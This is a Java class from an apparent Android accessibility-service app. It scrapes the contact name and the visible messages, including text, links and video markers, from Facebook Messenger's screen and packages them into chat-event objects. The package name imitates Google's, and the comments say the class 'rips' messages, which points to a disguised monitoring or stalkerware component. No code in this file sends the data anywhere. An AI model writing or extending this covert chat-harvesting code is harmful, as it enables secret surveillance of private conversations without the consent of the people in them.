package service.android.google.com.accessibility.scraper.scrapers;

import android.view.View;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

import service.android.google.com.accessibility.model.ChatEvent;
import service.android.google.com.accessibility.model.ChatMessage;
import service.android.google.com.accessibility.model.PackageConstants;
import service.android.google.com.accessibility.model.Person;
import timber.log.Timber;

/**
 * Scraper for Messenger.
 * Rips the visible messages on screen.
 * <a href="https://play.google.com/store/apps/details?id=com.facebook.orca">Facebook Messenger</a>
 */
public class MessengerScraper extends AbstractChatWindowScraper {

    //<editor-fold desc="Resource IDS">
    /**
     * {@link View} containing the contact information
     */
    public static final String CONTACT_NAME_RES_ID = "thread_title_name";

    /**
     * {@link LinearLayout} containing views that display different type of messages
     * Text, Video, Audio, Giphy, Link, ...
     */
    public static final String MESSAGE_CONTAINER_RES_ID = "message_container";

    /**
     * {@link TextView} containing solely the text
     */
    public static final String MESSAGE_TEXT_RES_ID = "message_text";

    /**
     * {@link RelativeLayout} that contains the preview image (inline_video_cover_image) the button
     * for video playback (button_camera_video_play) and the video length (inline_video_status)
     */
    public static final String MESSAGE_VIDEO_RES_ID = "message_video";

    /***
     * {@link TextView} containing the name of the third party message.
     */
    public static final String MESSAGE_THIRD_PARTY_NAME_RES_ID = "app_name";

    /**
     * {@link TextView} containing the title for the send link.
     */
    public static final String MESSAGE_LINK_TITLE_TEXT = "title_text";

    /**
     * {@link TextView} containing the description for the send link.
     */
    public static final String MESSAGE_LINK_DESCRIPTION_TEXT = "description_text";

    /**
     * {@link TextView} containing the source (website) for the send link.
     */
    public static final String MESSAGE_LINK_SOURCE = "source_text";
    private String hashCode;
    //</editor-fold>

    public MessengerScraper() {
        super(PackageConstants.APP_MESSENGER);
    }

    @Override
    public ChatEvent getChatEventFromAccessibilityNodeInfo(final AccessibilityNodeInfo nodeInfo) {
        final List<AccessibilityNodeInfo> contact_name = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResID(CONTACT_NAME_RES_ID));
        if (contact_name.size() < 1) {
            Timber.e("Contact Name not found in Messenger");
            return null;
        }

        final String contactName = contact_name.get(0).getContentDescription().toString();
        setContactPersonFromName(contactName);

        hashCode = String.format("%d_%s", nodeInfo.getPackageName().toString().hashCode(), contactName.replace(" ", "_"));
        final ChatEvent.Builder builder = ChatEvent.builder()
                .packageName(nodeInfo.getPackageName().toString());

        return scrapeChatMessages(builder, nodeInfo);
    }

    private ChatEvent scrapeChatMessages(final ChatEvent.Builder unfinishedBuilder,
                                         final AccessibilityNodeInfo nodeInfo) {
        final List<AccessibilityNodeInfo> message_text_containers = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_CONTAINER_RES_ID));
        if (message_text_containers.size() < 1) {
            Timber.e(String.format("No messages found with contact: %s", getContactPerson().fullName()));
            return null;
        }

        final List<ChatMessage> messages = getChatMessagesFromMessageContainer(message_text_containers);
        if (messages.size() < 1) {
            return null;
        }

        return unfinishedBuilder
                .messages(messages)
                .build();
    }

    private synchronized List<ChatMessage> getChatMessagesFromMessageContainer(final List<AccessibilityNodeInfo> message_text_containers) {
        final List<ChatMessage> chatMessages = new ArrayList<>();
        final Person contactPerson = getContactPerson();
        final Person you = getYou();
        for (AccessibilityNodeInfo message_container : message_text_containers) {
            final boolean isMessageFromContact = isMessageFromContactPerson(message_container);
            final String stringifyMessage = getTextFromMessageContainer(message_container);
            final int hashMessageText = stringifyMessage.hashCode();

            chatMessages.add(ChatMessage.builder()
                    .messagesHash(String.format("%s_%d", hashCode, hashMessageText))
                    .text(stringifyMessage)
                    .person(isMessageFromContact ? contactPerson : you)
                    .build());
        }
        return chatMessages;
    }

    private boolean isMessageFromContactPerson(final AccessibilityNodeInfo message_container) {
        return !message_container.isClickable();
    }

    private String getTextFromMessageContainer(final AccessibilityNodeInfo message_container) {
        final MessageType typeOfMessage = determineTypeOfMessage(message_container);

        String messageText = null;
        final AccessibilityNodeInfo parent = message_container.getParent();
        switch (typeOfMessage) {
            case TEXT:
                messageText = parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_TEXT_RES_ID)).get(0).getText().toString();
                break;
            case VIDEO:
                messageText = "[VIDEO]";
                break;
            case THIRD_PARTY:
                messageText = String.format("[THIRD PARTY]: %s",
                        parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_THIRD_PARTY_NAME_RES_ID)).get(0).getText().toString());
                break;
            case LINK:
                messageText = String.format("[LINK]: %s %s %s",
                        parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_LINK_TITLE_TEXT)).get(0).getText().toString(),
                        parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_LINK_DESCRIPTION_TEXT)).get(0).getText().toString(),
                        parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_LINK_SOURCE)).get(0).getText().toString());
                break;
            case UNKNOWN:
                Timber.e("Unknown message type in MessengerRipper.");
                messageText = "UNKNOWN type";
        }
        return messageText;
    }

    private MessageType determineTypeOfMessage(final AccessibilityNodeInfo message_container) {
        AccessibilityNodeInfo parent = message_container.getParent();

        if (parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_VIDEO_RES_ID)).size() >= 1) {
            return MessageType.VIDEO;
        }

        if (parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_THIRD_PARTY_NAME_RES_ID)).size() >= 1) {
            return MessageType.THIRD_PARTY;
        }

        if (parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_LINK_TITLE_TEXT)).size() >= 1) {
            if (parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_LINK_DESCRIPTION_TEXT)).size() >= 1) {
                if (parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_LINK_SOURCE)).size() >= 1) {
                    return MessageType.LINK;
                }
            }
        }

        if (parent.findAccessibilityNodeInfosByViewId(getFQResID(MESSAGE_TEXT_RES_ID)).size() >= 1) {
            return MessageType.TEXT;
        }

        return MessageType.UNKNOWN;
    }

    enum MessageType {
        UNKNOWN,
        TEXT,
        VIDEO,
        THIRD_PARTY,
        LINK
    }
}